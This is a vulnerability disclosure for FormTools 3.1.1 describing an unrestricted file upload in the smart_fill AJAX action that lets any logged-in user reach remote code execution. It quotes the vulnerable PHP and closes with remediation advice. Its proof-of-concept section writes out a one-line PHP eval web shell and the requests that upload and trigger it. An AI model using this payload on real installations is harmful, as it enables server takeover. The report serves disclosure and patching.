# FormTools 3.1.1 smart_fill upload endpoint allows authenticated arbitrary .php upload leading to remote code execution (any logged-in user, including low-privileged clients)

## Summary

The FormTools AJAX handler global/code/actions.php exposes smart_fill upload actions that save an uploaded file (only prefixed ft_sf_tmp_) into the default Web-accessible rootDir/upload directory via Files::uploadFile(), which performs no extension/MIME/content validation before rename() and chmod 0777. The endpoint accepts any authenticated account (checkAuth('user', false) allows admin and client) and is not CSRF-protected, so a PHP web shell can be uploaded and executed.

## Details

global/code/actions.php authenticates with checkAuth('user', false) (lines 31-55), which only requires a logged-in account (User.class.php checkAuth 355-420) and never restricts smart_fill uploads to administrators; no CSRF token is checked. The case upload_scraped_page_for_smart_fill (lines 298-325) reads the destination file_upload_dir from core settings (default rootDir/upload; Installation.class.php 190-191), builds $filename='ft_sf_tmp_'.$_FILES['form_page_1']['name'] (313) and calls Files::uploadFile() (316). Files.class.php:378-397 only verifies folder writability, then rename()s the file with chmod 0777 with no extension/MIME/content checks. Requesting /upload/ft_sf_tmp_shell.php afterwards executes the attacker PHP. Source-to-sink: actions.php:44-55 entry auth -> actions.php:313-316 filename construction -> Files.class.php:378-397 rename to Web dir -> URL request triggers code execution.

Core vulnerable code path:

```php
// global/code/actions.php:298-320
case "upload_scraped_page_for_smart_fill":
 $settings = Settings::get(array("file_upload_dir","file_upload_url"),"core");
 $filename = "ft_sf_tmp_".$_FILES["form_page_1"]["name"];
 list($g_success,$g_message,$final_filename)=Files::uploadFile($settings["file_upload_dir"],$filename,$_FILES["form_page_1"]["tmp_name"]);
 if($g_success){header("location: ".$settings["file_upload_url"]."/".$final_filename);exit;}
```

Entry/trust-boundary failure: checkAuth('user', false) is satisfied by any authenticated admin or client; the uploaded basename keeps the .php extension and is stored into the Web-accessible upload dir.

```php
// global/code/Files.class.php:378-397
public static function uploadFile($folder,$filename,$tmp_location){
 if(!is_dir($folder)||!is_writable($folder)){return array(false,$LANG["notify_invalid_upload_folder"],"");}
 $unique_filename=Files::getUniqueFilename($folder,$filename);
 if(rename($tmp_location,"$folder/$unique_filename")){@chmod("$folder/$unique_filename",0777);return array(true,$LANG["notify_file_uploaded"],$unique_filename);}
 return array(false,$LANG["notify_file_not_uploaded"],"");}
```

Sink: uploadFile performs no extension/MIME/content validation; it only checks writability then rename() and chmod 0777.

## POC

Preconditions: any authenticated client/admin account; default file_upload_dir=rootDir/upload where PHP is executed. 

Steps: 

1) multipart POST /global/code/actions.php?action=upload_scraped_page_for_smart_fill with Cookie PHPSESSID=<session>, file field form_page_1=shell.php containing <?php @eval($_GET['c']);?>; expected 302 Location to ft_sf_tmp_shell.php. 
<img width="2086" height="1377" alt="image" src="https://github.com/user-attachments/assets/3dc93939-467e-4b53-91bb-3e40064e15fb" />

2) GET /upload/ft_sf_tmp_shell.php?c=system('id'); returns the id output, proving RCE.
<img width="1017" height="317" alt="image" src="https://github.com/user-attachments/assets/086c5b50-12dc-4b8f-b0a7-f67143bb3997" />

## Impact

Any authenticated user (including a low-privileged client) can upload and execute a PHP web shell with Web server privileges; absence of CSRF tokens also enables cross-site triggering from an authenticated victim; confidentiality, integrity, and availability are compromised.

## Remediation

Server-side random filenames plus extension allow-list and MIME/content validation; disable script execution in the upload directory; add CSRF tokens to every actions.php action; restrict smart_fill to administrators bound to an add_form_form_id session; store transient scraper files in a non-executable private directory.

## Supplemental Information

### Affected products

- Vendor / project: Form Tools Core
- Repository: https://github.com/formtools/core
- Issue：https://github.com/formtools/core/issues/957
- Package name: formtools
- Affected versions: 3.1.1
- Patched versions: none confirmed

### Vulnerability type

- Arbitrary File Upload
- CWE: CWE-434 Unrestricted Upload of File with Dangerous Type
- Suggested severity: High

### Reporter

Guangzhou University: Wen Youwen, Wang Le
